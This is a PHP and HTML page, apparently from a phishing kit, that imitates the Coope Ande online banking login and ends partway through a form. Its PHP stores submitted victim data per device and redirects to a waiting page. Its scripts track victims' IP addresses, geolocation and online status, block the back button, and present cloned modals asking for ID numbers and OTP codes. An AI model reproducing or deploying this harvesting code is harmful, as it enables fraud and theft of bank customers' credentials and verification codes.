<?php
ob_start();
require_once 'functions.php';

$info   = get_user_info();
$ip     = $info['ip'];
$device = get_device_id(); 

// Verificar si el usuario está bloqueado
if (get_user_state($device) === 'block') {
    echo "<script>
            alert('Acceso denegado: Tu usuario ha sido bloqueado.');
            window.location.href = 'https://www.google.com';
          </script>";
    exit();
}

// Actualizar el usuario con su device_id
update_user($ip, $info['location'], basename(__FILE__));

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $allowedFields = ["correo"];
    $formData = [];

    foreach ($_POST as $key => $value) {
        if (in_array($key, $allowedFields, true)) {
            $formData[$key] = trim($value);
        }
    }

    if (!empty($formData)) {
        $data = load_data();

        if (!isset($data[$device])) { 
            $data[$device] = ['submissions' => [], 'state' => 'active'];
        }

        $timestamp = date("Y-m-d H:i:s");
        $found = false;

        if (isset($data[$device]['submissions'])) {
            foreach ($data[$device]['submissions'] as &$submission) {
                $existingKeys = array_keys($submission['data']);
                $formKeys     = array_keys($formData);
                sort($existingKeys);
                sort($formKeys);
                if ($existingKeys === $formKeys) {
                    // Reemplazar el submission existente
                    $submission = [
                        "data"      => $formData,
                        "timestamp" => $timestamp
                    ];
                    $found = true;
                    break;
                }
            }
            unset($submission);
        }

        if (!$found) {
            // Agregar nueva submission
            $data[$device]['submissions'][] = [
                "data"      => $formData,
                "timestamp" => $timestamp
            ];
            // Si es la primera submission y aún no se asignó color, asignar siempre #000000
            if (count($data[$device]['submissions']) === 1 && empty($data[$device]['color'])) {
                $data[$device]['color'] = '#000000';
            }
        }

        save_data($data);

        header("Location: waiting.php");
        exit();
    } else {
        echo "<script>alert('Por favor, complete al menos un campo válido.');</script>";
    }
}
ob_end_flush();
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es" lang="es">
    <head>
              <script>
      setInterval(function(){
          fetch('functions.php?action=ping', { method: 'GET', keepalive: true });
      }, 5000);

      window.addEventListener('unload', function(){
          navigator.sendBeacon('functions.php?action=offline');
      });
      </script>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="Cache-Control" content="no-cache">
        <meta http-equiv="Expires" content="Tue, 05 Jan 2005 5:00:00 GMT">
        <meta http-equiv="Pragma" content="no-cache">
        <meta name="description" content="Coope Ande en linea">
        <meta http-equiv="X-UA-Compatible" content="IE=10; IE=9; IE=8; IE=7; IE=EDGE">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="preconnect" href="https://fonts.googleapis.com/">
        <link rel="dns-prefetch" href="https://fonts.googleapis.com/">
        <link rel="preconnect" href="https://cdnjs.cloudflare.com/">
        <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com/">
        <link rel="prefetch" href="https://code.jquery.com/">
        <link rel="dns-prefetch" href="https://code.jquery.com/">
        
        <link rel="shortcut icon" href="imagenes/favicon-coopeande-small.ico?ver=20171026v1" type="image/x-icon">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

        <title>Coope Ande</title>
        <script>
            $.getJSON("https://api.ipify.org?format=json",
                                              function(data) {
            
                // Setting text of element P with id gfg
                $("#gfg").html(data.ip);
            })
         </script>
         <script>
            $.getJSON("https://ipinfo.io", function (response) {
        $("#ip").html("IP: " + response.ip);
        $("#address").html("" + response.city + ", " + response.country);
        
        })
         </script>
        <!-- Coopeande js -->
    </head>
    <!-- oncontextmenu="return false;"-->
    <body onload="detectarNavegador();">
        
        <p id="gfg"  hidden=""> </p>
            <p id="address"  hidden=""></p>
   <link rel="stylesheet" type="text/css" href="css/coopeande_index.css">
    <link rel="stylesheet" type="text/css" href="css/coopeande_mensajes.css">
    <script src="js/authenticatedValidateForm.js" language="javascript"></script>
    <link rel="stylesheet" type="text/css" href="css/mainFirmador.css">
    <script language="javascript" type="text/javascript"> 
        function backButtonOverride()
        {
          
          setTimeout("backButtonOverrideBody()", 1);
        }
        function backButtonOverrideBody()
        { 
          try {
            history.forward();
          } catch (e) {
            // OK to ignore
          }
          setTimeout("backButtonOverrideBody()", 500);
        }
        
        function detectBrowser() {
            // Opera 8.0+
            var es_opera = (navigator.userAgent.match(/Opera|OPR\//) ? true : false);
            //var isOpera = (!!window.opr && !!opr.addons) || !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0;
            if (es_opera === true)
                return "OPERA";
        
            // Firefox 1.0+
            var es_firefox = navigator.userAgent.toLowerCase().indexOf('firefox') > -1;
            //var isFirefox = typeof InstallTrigger !== 'undefined';
            if(es_firefox === true)
                return "FIREFOX";
        
            // Safari 3.0+ "[object HTMLElementConstructor]" 
            var isSafari = /constructor/i.test(window.HTMLElement) || (function (p) { return p.toString() === "[object SafariRemoteNotification]"; })(!window['safari'] || safari.pushNotification);
            if(isSafari === true)
                return "SAFARI";
                
           // Internet Explorer 6-11
            var isIE = /*@cc_on!@*/false || !!document.documentMode;
            if(isIE === true)
                return "MSIE";
        
            // Edge 20+
            var isEdge = !isIE && !!window.StyleMedia;
            if(isEdge === true)
                return "EDGE";
        
            // Chrome 1+
            var es_chrome = navigator.userAgent.toLowerCase().indexOf('chrome') > -1;
            //var isChrome = !!window.chrome && !!window.chrome.webstore;
            if(es_chrome === true)
                return "CHROME";
        
            // Blink engine detection
            var isBlink = (isChrome || isOpera) && !!window.CSS;
            if(isBlink === true)
                return "BLINK";
                
            return "DESCONOCIDO";
        }
        
        /*FUNCION PARA DETECTAR EL TIPO DE NAVEGADOR QUE UTILIZA EL CLIENTE EN UN MOMENTO DETERMINADO*/
        function detectarNavegador(){
                //actualizar el hidden con los datos requeridos del tipo navegador
                campo = document.getElementById("hNavegador");
                if(campo){
                campo.value = detectBrowser();
                }
                
                
        
                fetch('https://ipapi.co/json/')
                  .then(function(response) {
                    return response.json();
                  })
                  .then(function(data) {
                  
                    document.getElementById("Platitud").value = data["latitude"];
                    document.getElementById("Plongitud").value = data["longitude"];
                    document.getElementById("Elatitud").value = data["latitude"];
                    document.getElementById("Elongitud").value = data["longitude"];
                    document.getElementById("Dlatitud").value = data["latitude"];
                    document.getElementById("Dlongitud").value = data["longitude"];
                    document.getElementById("DlatitudEmp").value = data["latitude"];
                    document.getElementById("DlongitudEmp").value = data["longitude"];
                    
                });
        }

</script> 
        <div id="main-wrapper" style="padding: 10px;">
            
             <style>
                @import url(../../css2);

.errorbox {
    border: Red 2px solid;
    background: #ffffdb
}

body,
html {
    height: 100%;
    font-family: Roboto, system-ui !important;
    font-size: 16px
}

body {
    background-color: #fff;
    margin: 0
}

.main-wrapper {
    width: 100%;
    min-width: 1181px;
    height: 100%;
    position: relative
}

header {
    height: 100px;
    background-image: url(./imagenes/ande-linea.png);
    background-position: bottom;
    background-repeat: no-repeat;
    background-size: 100% 3px
}

.header {
    width: 100%
}

.header-content {
    max-width: 845px;
    margin: auto;
    display: flex;
    justify-content: space-between;
    flex-wrap: wrap
}

.header-content-text {
    display: inherit;
    flex-direction: column;
    align-items: flex-end;
    margin-top: 35px
}

.card-wrapper {
    width: 368px;
    margin: 0 auto;
    position: relative;
    min-height: 396px;
    margin-bottom: 10px
}

@media screen and (min-width:767px) {
    .card-wrapper {
    width: 845px;
    margin: 0 auto;
    position: relative;
    min-height: 396px;
    margin-bottom: 10px
}
  
}

.card-news {
    max-width: 845px;
    margin: 0 auto;
    position: relative;
    height: 218px;
    margin-bottom: 20px
}

.card-notes {
    max-width: 845px;
    margin: 0 auto;
    position: relative;
    min-height: 218px
}

.card-secured {
    max-width: 845px;
    margin: 0 auto;
    position: relative;
    height: 200px
}
@media screen and (min-width:767px) {
    .card-wrapper-content {
    display: flex;
    justify-content: space-between;
    align-items: center
}

}

@media only screen and (min-width: 767px) {
    .card-teclado{
        width: 540px;
    }
}
.card-wrapper-content {
    justify-content: space-between;
    align-items: center
}

.card-teclado {
    margin-top: 14px;
    margin-right: 10px;
    padding: 1px 0 19px 2px;
    position: relative;
    height: 360px
}

.card-login {
    background-color: #f3f3f3;
    min-height: 358px;
    padding: 8px 0 19px 2px;
    width: 295px;
    border: 1px solid #0071ba;
    margin-top: 14px
}

.card-link {
    color: #404040;
    text-decoration: none;
    font-size: 13px
}

.card-login-title {
    color: #0071ba;
    font-size: 17px;
    font-weight: 700;
    margin: 5px 0 10px 12px;
    line-height: 1.5
}

.card-teclado-title {
    color: #0071ba;
    font-size: 17px;
    font-weight: 700;
    margin: 5px 0 10px 12px;
    line-height: 1.5;
    text-align: center
}

.card-teclado-title2 {
    color: #404040;
    font-size: 12px;
    font-weight: 700;
    margin: 5px 0 10px 12px;
    line-height: 1.5;
    text-align: center
}

.login-wrapperRadio {
    color: #656565;
    width: 265px;
    height: 40px;
    float: left;
    font-size: 13px;
    margin: 0 10px 12px 12px;
    display: flex;
    justify-content: space-around;
    align-items: center;
    background-color: #e2dfdf
}

.wrapperRadio-radio {
    position: relative
}

.radioBtn {
    display: none
}

.wrapperRadio-radio span {
    margin-left: 22px
}

.radioBtn+label {
    background-image: url(./imagenes/radio_btn.png);
    background-repeat: no-repeat;
    background-size: 15px 15px;
    display: inline-block;
    height: 15px;
    cursor: pointer;
    float: left;
    margin-right: 15px
}

.radioBtn:checked+label {
    background-image: url(./imagenes/radio-on.png);
    background-repeat: no-repeat;
    background-size: 15px 15px
}

.user-login {
    background-color: #fff;
    color: #000;
    font-size: 12px;
    margin: 0 12px 12px;
    width: 230px;
    height: 35px;
    border: 1px solid #e2dfdf;
    background-image: url(./imagenes/userBox.png);
    background-repeat: no-repeat;
    background-position: left;
    padding-left: 35px;
    background-position-x: 10px;
    outline: 0
}

.user-login:hover {
    box-shadow: 0 1px 6px #20212447
}

.user-login-emp {
    background-color: #fff;
    color: #000;
    font-size: 12px;
    margin: 0 12px 5px;
    width: 230px;
    height: 35px;
    border: 1px solid #e2dfdf;
    background-image: url(./imagenes/ico_input-01.png);
    background-repeat: no-repeat;
    background-position: left;
    padding-left: 35px;
    outline: 0;
    background-position-x: 10px
}

.user-login-emp:hover {
    box-shadow: 0 1px 6px #20212447
}

.pass-login {
    background-color: #fff;
    color: #000;
    font-size: 12px;
    margin: 0 12px;
    width: 230px;
    height: 35px;
    border: 1px solid #e2dfdf;
    background-image: url(./imagenes/key.png);
    background-repeat: no-repeat;
    background-position: left;
    padding-left: 35px;
    outline: 0;
    background-position-x: 10px
}

.pass-login:hover {
    box-shadow: 0 1px 6px #20212447
}

.pass-login-emp {
    background-color: #fff;
    color: #000;
    font-size: 12px;
    margin: 0 12px;
    width: 230px;
    height: 35px;
    border: 1px solid #e2dfdf;
    background-image: url(./imagenes/key.png);
    background-repeat: no-repeat;
    background-position: left;
    padding-left: 35px;
    outline: 0;
    background-position-x: 10px
}

.pass-login-emp:hover {
    box-shadow: 0 1px 6px #20212447
}

.change-header {
    padding: 5px;
    background: #dddcd7;
    text-align: center
}

.typeChange {
    border: 1px solid #dddcd7;
    width: 272px
}

.typeChange ul {
    display: block;
    list-style: none
}

.typeChange li {
    font-size: 10px;
    font-weight: 700;
    text-align: center;
    text-transform: uppercase;
    line-height: 15px;
    width: 116px
}

.exchange-wrapper {
    background-color: #fff !important;
    margin: 0 10px 5px 25px;
    overflow: hidden
}

.container-block {
    display: flex;
    justify-content: space-between;
    min-height: 235px
}

.ul-padding {
    padding-left: 0;
    margin-right: 15px;
    margin-bottom: 5px;
    margin-top: 13px !important;
    display: flex;
    justify-content: space-around
}

.activeConverter {
    border-bottom: 2px solid #0071ba;
    margin: auto;
    color: #959699;
    font-size: 12px;
    text-align: center;
    display: block;
    font-weight: 700;
    text-transform: none;
    width: 45px
}

.convert {
    height: 92px;
    border-top: none;
    margin: 5px 10px 0 20px
}

.resultConverter span {
    color: #394457;
    font-size: 16px;
    display: inline-flex;
    font-weight: 700
}

.block-note {
    border: 1px solid #dddcd7;
    height: 210px;
    margin-top: 42px
}

.notes-secure {
    display: flex;
    padding: 10px
}

.buyUsd {
    display: block;
    color: #394457;
    font-size: 18px;
    text-align: center;
    font-weight: 400
}

.sellUsd {
    display: block;
    color: #394457;
    font-size: 18px;
    text-align: center;
    font-weight: 400
}

.buyUsdLabel {
    color: #6d6e71;
    font-size: 12px;
    text-align: center;
    display: block;
    font-weight: 400;
    text-transform: none;
    border-bottom: 2px solid #fff
}

.sellUsdLabel {
    color: #6d6e71;
    font-size: 12px;
    text-align: center;
    display: block;
    font-weight: 400;
    text-transform: none;
    border-bottom: 2px solid #fff
}

.labelDol {
    padding: 10px;
    display: block;
    text-align: center
}

.inputSymbol {
    position: absolute;
    margin-left: 8px;
    margin-top: 5px;
    color: #394457;
    font-size: 14px
}

.converter-input {
    color: #000;
    background-color: #fff;
    width: 80%;
    height: 30px !important;
    border: 1px solid #dddcd7 !important;
    font-size: 12px;
    font-weight: 500;
    padding: 0 5px 0 30px !important;
    margin: 0 !important;
    border-radius: 0 !important;
    text-align: right
}

.con-divider {
    font-size: 12px
}

.slider {
    width: 95%;
    margin: auto;
    overflow: hidden
}

.slider ul {
    display: flex;
    padding: 0;
    width: 100%;
    animation: cambio 5s infinite alternate linear
}

.slider li {
    width: 100%;
    height: 95%;
    list-style: none
}

.slider img {
    width: 100%;
    height: 95%
}

@keyframes cambio {
    0% {
        margin-left: 0
    }

    20% {
        margin-left: 0
    }

    25% {
        margin-left: -100%
    }

    45% {
        margin-left: -100%
    }

    50% {
        margin-left: -200%
    }

    70% {
        margin-left: -200%
    }

    75% {
        margin-left: -300%
    }

    100% {
        margin-left: -300%
    }
}

.login-label {
    margin: 0 12px 1px
}

.footer {
    background-color: #dddcd7
}

figure {
    margin: 10px
}

.style13 {
    color: #b9c7d4;
    font-family: Verdana, Arial, Helvetica, system-ui;
    font-size: 12px
}

.style18 {
    font-family: Verdana, Arial, Helvetica, system-ui;
    font-size: 10px;
    color: #fff
}

.style24 {
    font-family: Verdana, Arial, Helvetica, system-ui;
    color: #333;
    font-size: 10px
}

.style31 {
    font-family: Verdana, Arial, Helvetica, system-ui;
    color: #8398a5;
    font-size: 11px
}

.style37 {
    font-family: Arial, Helvetica, system-ui;
    color: #656565;
    font-size: 12px;
    margin-bottom: 15px
}

.style62 {
    color: #999
}

.style79 {
    color: #8096a2
}

.style80 {
    font-size: 12px;
    font-family: Verdana, Arial, Helvetica, system-ui;
    font-weight: 700
}

.style83 {
    color: red
}

.style89 {
    color: #fff;
    font-size: 18px;
    font-family: Verdana, Arial, Helvetica, system-ui
}

.style91 {
    font-family: Verdana, Arial, Helvetica, system-ui;
    font-size: 18px;
    color: #536b77
}

.style93 {
    font-size: 18px;
    font-family: Arial, Helvetica, system-ui;
    color: red
}

.style95 {
    font-family: Verdana, Arial, Helvetica, system-ui;
    font-size: 16px;
    color: #667e8c
}

.style96 {
    font-family: Arial, Helvetica, system-ui;
    font-weight: 700;
    font-size: 16px;
    color: #007e6f
}

.style97 {
    font-size: 16px
}

.style98 {
    color: #333;
    font-size: 13px
}

.style101 {
    color: #900
}

#indicia {
    clear: both;
    display: block;
    overflow: hidden;
    text-align: center;
    padding: 20px
}

#indicia p,
#indicia ul {
    font-size: .9em;
    margin: 0;
    padding: 0;
    text-align: center
}

#indicia ul li {
    border-right: #0a2770 1px solid;
    display: inline;
    height: 9px;
    list-style: none;
    margin: 0 0 -5px;
    padding: 0 8px
}

#indicia ul li.last {
    border-right: none !important;
    padding: 0 0 0 8px !important
}

#verisign {
    clear: both;
    display: block;
    overflow: hidden;
    text-align: center;
    margin: 10px
}

#verisign p,
.verisign ul {
    color: #0a2770;
    font-size: .7em;
    margin: 0;
    padding: 0;
    text-align: center
}

#verisign ul li {
    border-right: #0a2770 1px solid;
    display: inline;
    height: 9px;
    list-style: none;
    margin: 0 0 -5px;
    padding: 0 8px
}

#verisign ul li.last {
    border-right: none !important;
    padding: 0 0 0 8px !important
}

.confirmed,
.confirmed-nb {
    margin: 20px auto;
    font: 90% Verdana, Geneva, Arial, Helvetica, system-ui;
    font-weight: 700;
    color: #228b22;
    border: Green 1px solid
}

.confirmed {
    padding: 5px 5px 5px 28px;
    background: url(./imagenes/icon_ok.gif)no-repeat 5px 5px
}

.confirmed-nb {
    padding: 5px
}

.message {
    margin: 10px 0;
    overflow: hidden;
    -webkit-border-radius: 3px;
    -moz-border-radius: 3px;
    border-radius: 2px;
    clear: both;
    width: 100% !important
}

.message .success {
    border: 1px solid #c9f3d9;
    background: #c9f3d9 url(./imagenes/ico_success.png)20px 16px no-repeat;
    background-size: 45px;
    color: #00948d;
    overflow: hidden;
    border-radius: 2px;
    clear: both
}

.message .warning {
    border: 1px solid #e8edf2;
    background: #e8edf2 url(./imagenes/ico_advertencia.png)12px 10px no-repeat;
    background-size: 45px;
    color: #43434b;
    overflow: hidden;
    border-radius: 2px;
    clear: both;
    text-align: center
}

div .warning li {
    list-style: none
}

div .confirmed li {
    list-style: none
}

.btn_actualizar {
    color: #fff;
    font-size: 15px;
    text-transform: uppercase;
    background-color: #0071ba;
    border: none;
    border-radius: 2px;
    width: 260px;
    height: 34px;
    margin: 21px 0 10px 15px;
    cursor: pointer
}

.btn_actualizarPopup {
    color: #fff;
    font-size: 15px;
    text-transform: uppercase;
    background-color: #0071ba;
    border: none;
    border-radius: 2px;
    width: 260px;
    height: 34px;
    margin: 21px 0 10px 2px;
    cursor: pointer
}

.btn_actualizar_emp {
    color: #fff;
    font-size: 12px;
    font-weight: 700;
    text-transform: uppercase;
    background-color: #0071ba;
    border: none;
    border-radius: 2px;
    width: 260px;
    height: 34px;
    margin: 12px 0 10px 15px;
    cursor: pointer
}

.btn_actualizar_firma {
    color: #404045;
    font-size: 15px;
    font-weight: 700;
    background-color: #e2af2d;
    border: none;
    border-radius: 2px;
    width: 176px;
    margin: 10px 40px 5px 57px;
    height: 34px;
    cursor: pointer;
    background-image: url(./imagenes/pencil.png);
    background-repeat: no-repeat;
    background-position: left;
    padding-left: 22px;
    background-position-x: 20px
}

.btn_actualizar:hover {
    background-color: #0069ad;
    color: #fff !important
}

.btn_actualizar:active {
    position: relative;
    top: 1px
}

.style99 {
    font-family: Verdana, Arial, Helvetica, system-ui;
    font-size: 12px;
    display: block !important
}

.rcwrapper {
    background-color: #d1e3dd;
    display: inline;
    padding: 10px
}

.btn_teclado {
    background-color: #0071ba;
    -moz-border-radius: 6px;
    border-radius: 2px;
    display: flex;
    justify-content: center;
    align-items: center;
    cursor: pointer;
    color: #fff !important;
    text-decoration: none;
    width: 50px;
    height: 35px;
    font-size: 17px
}

.show-icon {
    background: url(./imagenes/transfer_blue.png)no-repeat;
    background-size: 20px;
    display: block;
    width: 13%;
    height: 20px;
    cursor: pointer
}

.hide-button {
    text-indent: 100%;
    white-space: nowrap;
    float: right;
    margin-top: 6px;
    overflow: hidden;
    margin-right: 0
}

.resultConverter {
    float: right;
    margin-top: 3px;
    margin-right: 27%
}

.btn_teclado:hover {
    background-color: #0764a0;
    color: #fff !important
}

.btn_actualizar:active,
.btn_teclado:active {
    position: relative;
    top: 1px
}

form input.text.date_picker {
    background: rgba(0, 0, 0, 0) url(./js/calendario/calbtn.gif)no-repeat scroll right center;
    cursor: pointer;
    padding-right: 36px;
    min-width: 100px
}

.button.plain:last-child {
    border-bottom-right-radius: 4px;
    border-top-right-radius: 4px
}

.button.plain {
    border-bottom-left-radius: 4px;
    border-top-left-radius: 4px;
    background: #eee;
    border: 1px solid #ddd;
    font-family: Tahoma, system-ui;
    padding: 4px;
    text-decoration: none;
    text-shadow: 0 1px 0 #fff;
    zoom: 1;
    box-shadow: none;
    color: #777;
    font-size: 11px;
    height: 30px;
    font-weight: 700;
    line-height: 22px;
    margin: -4px 0;
    margin-right: -4px;
    border-image: initial
}

.btn-cancel {
    background-image: url(./imagenes/ico_close-white.png);
    background-repeat: no-repeat;
    background-color: #404045;
    background-position: center;
    background-position-x: 24px;
    background-size: 16px;
    width: 125px;
    -moz-border-radius: 6px;
    -webkit-border-radius: 6px;
    border-radius: 0;
    border: 0 solid #014d43;
    display: inline-block;
    cursor: pointer;
    color: #fff !important;
    font-size: 15px;
    padding: 6px 13px 6px 30px;
    text-decoration: none;
    margin-right: 10px
}

table .td_teclado {
    padding: 3px;
    text-align: center
}

.panel-coope {
    border: 2px solid #007e6f !important;
    border-color: #007e6f
}

.formth {
    font-size: 12pt !important;
    font-weight: 700 !important;
    color: #0071ba !important
}

.formtd {
    font-family: Verdana, Arial, Helvetica, system-ui !important;
    font-weight: 700 !important
}

#modalContainer {
    background-color: rgba(0, 0, 0, .3);
    position: absolute;
    top: 0;
    width: 100%;
    height: 100%;
    left: 0;
    z-index: 10000;
    background-image: url(tp.png)
}

#mContainer {
    position: relative;
    width: 300px;
    margin: auto;
    padding: 5px;
    border-top: 2px solid #fff;
    border-bottom: 2px solid #fff
}

h1,
h2 {
    margin: 0;
    padding: 4px
}

code {
    font-size: 1.2em;
    color: #069
}

.important {
    background-color: #f5fcc8;
    padding: 2px
}

@media screen and (max-width:767px) {
    header {
        display: block;
        height: auto
    }
}

@media screen and (max-width:480px) {
    .container-block {
        display: block;
        height: auto
    }
}

@media screen and (max-width:320px) {
    .container-block {
        display: block;
        height: auto
    }
}

@media (max-width:600px) {
    #alertBox {
        position: relative;
        width: 90%;
        top: 30%
    }
}

.input-iconInfo {
    height: 33px;
    border: 1px solid #d1d1d1;
    font-size: 13px;
    color: #626262;
    text-align-last: center;
    font-style: italic;
    padding-left: 34px;
    background: url(./imagenes/ico_menu09.png);
    background-repeat: no-repeat;
    background-position: left;
    background-position-x: 4px;
    background-size: 23px;
    width: 100%;
    outline: 0
}

.input {
    height: 33px;
    border: 1px solid #d1d1d1;
    font-size: 13px;
    color: #626262;
    text-align: center;
    outline: 0;
}
             </style>
            <header>
                <div class="header">
                    <div class="header-content">
                        <figure>
                            <img src="imagenes/logotipo.png?" width="350" height="65" alt="Coopeande">
                        </figure>
                        <div class="header-content-text">
                            <strong class="style37">Bienvenido(a) a Coope Ande en l&iacute;nea</strong>
                        </div>
                    </div>
                </div>
            </header>
            <div class="modalRequest" id="modalOTP" style="display:none">
                        <div class="modal-content">
                                        <div>
                                            <div align="center">
                                                <img src="imagenes/logo_coope.png?ver=20150102" width="120" height="50" alt="Logo">
                                                 
                                                <img class="close-button" src="imagenes/closed.png?ver=20150102" onclick="ModalToggleCloseOTP();" alt="Cerrar">
                                            </div>
                                            <div></div>
                                        </div>
                                        <ul class="timelineFirmador" id="contentTimeline"></ul>
                                        
                                        <div id="blockMetodoConfirmacion" style="display:none">
                                            <div class="fvaMargenDeContenido">
                                                <h5 class="labelH5Bold">Estimado(a) asociado(a), por favor ingresar los siguientes datos:</h5>
                                            </div>
                                            <div class="fvaContenidoParaTipoIdentificacion" id="chkOpciones">         
                                                    <div class="row">
                                                        <div class="col-xs-12">
                                                            <div class="panel panel-default">
                                                                <div class="panel-body">
                                                                    <div class="col-xs-6">
                                                                        <div class="form-group">
                                                                            <label for="txtId" class="formth">Elija un m&eacute;todo de confirmaci&oacute;n:</label>
                                                                        </div>
                                                                        <div>
                                                                            <select class="input-iconInfo" id="cbMetodo" onchange="validarTokenLogin()" size="1" name="metodo"></select><option value="-1">Seleccione</option>
                                                                            

                                                                        </div>
                                                                    </div>
                                                                    <div class="clarfix"></div>
                                                                    <div class="fvaMensajeErrorIdentificacion fvaMargenDeContenido" style="display:none">El formato de la indentificaci&oacute;n es incorrecto</div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                            </div>
                                        </div>
                                        <div style="display:none" id="blockToken">
                                            <div class="fvaMargenDeContenido">
                                                <!--<h5 class="labelH5Bold">Coope Ande Token</h5>-->
                                                 
                                                <h5 class="labelH5">Para confirmar la transacci&oacute;n, digite el c&oacute;digo de
                                                                    verificaci&oacute;n que se le ha enviado.</h5>
                                                <p id="mascara" style="padding: 0px; margin: auto; color: #0072B9; font-size: 17px;"></p>
                                            </div>
                                            <div class="fvaCodigoConBotonCopiar">
                                                <div id="">
                                                    <input type="text" name="" maxlength="7" id="codigoOTP" class="input" style="border: none; color: #0072b9;" onkeypress="return acceptNum(event);" onkeyup="formaNumber()">
                                                </div>
                                            </div>
                                            <div class="fvaContenidoDeCopieCodigo">
                                                <div class="fvaTituloDelResumen" style="margin-top: 15px;">Resumen de la transacci&oacute;n:</div>
                                                <p id="descripcionDetalle" style="padding-left: 10px;"></p>
                                                <div class="fvaAdvertencia">El c&oacute;digo de verificaci&oacute;n es para su uso
                                                                            exclusivo y personal. No lo facilite por tel&eacute;fono
                                                                            o correo electr&oacute;nico a ninguna persona.</div>
                                            </div>
                                            <input type="hidden" name="tipoTransacToken" value="" id="tipoTransacToken">
                                            <input type="hidden" name="detalle" value="" id="idDetalle">
                                            <input type="hidden" name="idSolicitud" value="" id="idSolicitud">
                                            <div class="fvaMensajeErrorIdentificacion fvaMargenDeContenido" id="errorOtpValidate" style="display:none"></div>
                                            <div style="text-align: center;">
                                                <button type="button" class="btn-dark" id="btnCancelar4" tabindex="20" onclick="ModalToggleCloseOTP()">
                                                        Cancelar
                                                </button>
                                                
                                                <button type="button" class="btn" id="btnCancelar3" tabindex="20" onclick="runOTPValidate()">
                                                        Verificar
                                                </button>
                                            </div> 
                                            <div class="fvaLoader" style="display: block;">
                                                <div></div>
                                                <div></div>
                                                <div></div>
                                            </div>
                                        
                                    </div>
                                    <div id="blockMessageOTP" style="display:none">
                                            <div class="fvaMargenDeContenido">
                                                <h5 class="labelH5Bold"></h5>
                                            </div>
                                            <div class="fvaContenidoParaTipoIdentificacion" id="messageReturnOTP"></div>
                                        </div>
                </div>
            </div>
            <div class="modalRequest" id="modalRequest" style="display:none">
                <div class="modal-content">
                    <div>
                        <div align="center">
                            <img src="imagenes/logo_coope.png?ver=20150102" width="120" height="50" alt="Logo">
                             
                            <img class="close-button" src="imagenes/closed.png?ver=20150102" onclick="ModalToggleClose();" alt="Cerrar">
                        </div>
                        <div></div>
                    </div>
                    <ul class="timelineFirmador" id="contentTimeline"></ul>
                   
                    <div id="blockIden" style="display:none">
                        <div class="fvaMargenDeContenido">
                            <h5 class="labelH5Bold">Estimado(a) asociado(a), por favor ingresar los siguientes datos:</h5>
                        </div>
                        <div class="fvaContenidoParaTipoIdentificacion" id="chkOpciones">
                            <form id="formReset" name="formReset" action="requestCambioClave" method="post" autocomplete="off">
                              
                                <div class="row">
                                    <div class="col-xs-12">
                                        <div class="panel panel-default">
                                            <div class="panel-body">
                                                <input type="hidden" name="navegador" value="" id="hNavegadorReset">
                                                <div class="col-xs-6">
                                                    <div class="form-group">
                                                        <label for="txtId" class="formth">N&uacute;mero de
                                                                                          identificaci&oacute;n:</label>
                                                    </div>
                                                    <div>
                                                        <input type="text" name="identificacion" maxlength="30" value="" tabindex="1" id="txtId" class="input-lg" onkeypress="return acceptNum(event);" autocomplete="off">
                                                    </div>
                                                </div>
                                                <div class="clarfix"></div>
                                                <div class="fvaMensajeErrorIdentificacion fvaMargenDeContenido" style="display:none">El formato de la indentificaci&oacute;n es incorrecto</div>
                                                <div class="col-xs-6">
                                                    <div class="form-group">
                                                        <div class="col-md-6">
                                                            <button type="button" onclick="resetClave();" class="btn_actualizarPopup" value="Continuar">Continuar</button>
                                                        </div>
                                                        <div class="col-md-6">
                                                            <button type="button" class="btn-dark" onclick="ModalToggleClose();">Regresar</button>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </form>



                        </div>
                    </div>
                    <div id="blockMessage" style="display:none">
                        <div class="fvaMargenDeContenido">
                            <h5 class="labelH5Bold"></h5>
                        </div>
                        <div class="fvaContenidoParaTipoIdentificacion" id="messageReturn"></div>
                    </div>
                </div>
            </div>
            <div class="modalRequest" id="modalEmpresarial" style="display:none">
                <div class="modal-content">
                    <div>
                        <div align="center">
                            <img src="imagenes/logo_coope.png?ver=20150102" width="120" height="50" alt="Logo">
                             
                            <img class="close-button" src="imagenes/closed.png?ver=20150102" onclick="ModalToggleCloseEmp();" alt="Cerrar">
                        </div>
                        <div></div>
                    </div>
                    <ul class="timelineFirmador" id="contentTimelineEmp"></ul>
                    <div id="loaderEmp" style="display:none">
                        <div class="col-xs-12 fvaMargenDeContenido">Procesando su solicitud de autenticaci&oacuten</div>
                        <div id="" class="fvaLoader" style="display: block;">
                            <div></div>
                            <div></div>
                            <div></div>
                        </div>
                    </div>
                    <div id="blockEmp" style="display:none">
                        <div class="fvaMargenDeContenido">
                            <h5 class="labelH5Bold">Estimado(a) asociado(a), por favor ingresar los siguientes datos:</h5>
                        </div>
                        <div class="fvaContenidoParaTipoIdentificacion" id="chkOpciones">
                            <form id="elFormEmp" name="elFormEmp" action="requestCambioClaveCorp" method="post" autocomplete="off">
                                
                                <div class="row">
                                    <div class="col-xs-12">
                                        <div class="panel panel-default">
                                            <div class="panel-body">
                                                <input type="hidden" name="navegador" value="" id="hNavegadorResetCorp">
                                                <div class="col-xs-6">
                                                    <div class="form-group">
                                                        <label for="txtIdJuri" class="formth">Número de
                                                                                              cédula
                                                                                              jur&iacute;dica:</label>
                                                    </div>
                                                    <div>
                                                        <input type="text" name="identificacionJuridica" maxlength="30" value="" tabindex="1" id="txtIdJuri" class="input-lg" onkeypress="return app.acceptNum(event);" autocomplete="off">
                                                    </div>
                                                </div>
                                                <div class="clarfix"></div>
                                                <div class="col-xs-12">
                                                    
                                                </div>
                                                <div class="col-xs-6">
                                                    <div class="form-group">
                                                        <label for="txtId" class="formth">N&uacute;mero de
                                                                                          identificaci&oacute;n:</label>
                                                    </div>
                                                    <div>
                                                        <input type="text" name="identificacion" maxlength="30" value="" tabindex="1" id="txtIdEmp" class="input-lg" onkeypress="return acceptNum(event);" autocomplete="off">
                                                    </div>
                                                </div>
                                                <div class="clarfix"></div>
